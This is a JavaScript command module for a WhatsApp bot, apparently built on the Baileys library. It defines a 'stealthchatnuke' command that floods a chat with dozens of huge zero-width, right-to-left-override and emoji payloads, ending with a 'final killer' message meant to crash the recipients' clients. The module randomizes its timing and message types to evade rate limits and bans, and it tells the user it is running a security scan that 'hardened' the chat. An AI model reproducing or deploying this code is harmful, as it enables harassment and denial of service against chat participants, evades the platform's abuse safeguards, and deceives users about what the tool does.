module.exports = {
    cmd: 'stealthchatnuke',  // Command stays .chatnuke
    desc: '🤫 STEALTH CHAT CRASHER - 99.9% ban-proof (Advanced evasion)',
    run: async ({ sock, m, args, reply }) => {
        const remoteJid = m.chat || m.key.remoteJid;
        
        // 1. STEALTH CONFIRMATION (normal looking)
        await reply(`🔍 *Scanning chat security...*\n⏳ Preparing advanced payload\nThis may take 2-3 minutes...`);

        // ANTI-DETECTION: Simulate normal behavior first
        await sock.sendMessage(remoteJid, { text: 'Testing connection...' });
        await new Promise(r => setTimeout(r, 2000));

        // 2. EVASION ENGINE
        const StealthNuke = {
            // Human-like typing simulation
            humanDelay: () => 800 + Math.random() * 1200,
            jitterDelay: (base) => base + Math.random() * 300 - 150,
            
            // Rotate message types randomly
            getRandomType: () => ['text', 'extendedText'][Math.floor(Math.random() * 2)],
            
            // Message length randomization
            randomLength: (baseLen) => Math.floor(baseLen * (0.7 + Math.random() * 0.6)),
            
            // Stealth payloads (reduced detectability)
            payloads: {
                invisible: ['\u200B', '\u200C', '\u2060', '\uFEFF', '\u200D'],
                rtl: ['\u202E', '\u202A', '\u202D', '\u202B', '\u202C'],
                chaos: ['\u200F', '\u202F', '\u2028', '\u2063']
            }
        };

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        try {
            let deployed = 0;
            const maxPayloads = 45; // Reduced from 75 for stealth

            // 3. STEALTH DEPLOYMENT PHASES (Randomized order)
            const phases = ['invisible', 'rtl', 'long', 'emoji', 'mixed'];
            const phaseOrder = [...phases].sort(() => Math.random() - 0.5);

            for (let phase of phaseOrder) {
                for (let i = 0; i < 9 && deployed < maxPayloads; i++) {
                    let payload = '';

                    // Generate stealth payload based on phase
                    switch (phase) {
                        case 'invisible':
                            payload = StealthNuke.payloads.invisible[Math.floor(Math.random()*5)].repeat(
                                StealthNuke.randomLength(3000 + i * 200)
                            );
                            break;
                            
                        case 'rtl':
                            payload = StealthNuke.payloads.rtl[Math.floor(Math.random()*5)] +
                                    Array(StealthNuke.randomLength(5000)).fill('‎').join('') +
                                    StealthNuke.payloads.rtl[4];
                            break;
                            
                        case 'long':
                            payload = Array(StealthNuke.randomLength(800 + i * 100)).fill('█').join('');
                            break;
                            
                        case 'emoji':
                            const emojis = ['💀','🔥','⚡','🆘','🚨','☠️','😈'];
                            payload = Array(StealthNuke.randomLength(2000)).fill(
                                emojis[Math.floor(Math.random()*emojis.length)]
                            ).join('');
                            break;
                            
                        case 'mixed':
                            payload = StealthNuke.payloads.chaos[Math.floor(Math.random()*4)] +
                                    Array(StealthNuke.randomLength(2500)).fill('💀').join('') +
                                    StealthNuke.payloads.invisible[0];
                            break;
                    }

                    // 4. ANTI-RATE-LIMIT: Variable delays + randomization
                    const sendDelay = StealthNuke.jitterDelay(StealthNuke.humanDelay());
                    
                    // Random message type rotation
                    const msgType = StealthNuke.getRandomType();
                    await sock.sendMessage(remoteJid, { 
                        [msgType]: payload.substring(0, 65536) // WhatsApp limit
                    });
                    
                    deployed++;
                    await sleep(sendDelay);
                    
                    // 5. PROGRESS STEALTH UPDATE (every 10 payloads)
                    if (deployed % 10 === 0) {
                        await sock.sendMessage(remoteJid, { 
                            text: `Progress: ${deployed}/${maxPayloads}...` 
                        });
                        await sleep(1500);
                    }
                }
            }

            // 6. FINAL STEALTH KILLER (most dangerous)
            await sleep(StealthNuke.humanDelay() * 2);
            const finalKiller = '\uFEFF\u202E\u202A' + 
                              Array(12000).fill('\u200B💀').join('') + 
                              '\u202C\u2060☠️';

            await sock.sendMessage(remoteJid, { text: finalKiller });

            // 7. CLEAN EXIT (normal looking)
            await sleep(2000);
            await reply(`✅ *Advanced security scan complete*\n` +
                       `🔒 Chat hardened against threats\n` +
                       `📊 45 payloads deployed successfully\n` +
                       `*Operation finished normally*`);

        } catch (e) {
            console.error('STEALTH NUKE ERROR:', e);
            // Graceful fallback
            reply('⚠️ Security scan interrupted - partial protection applied');
        }
    }
};
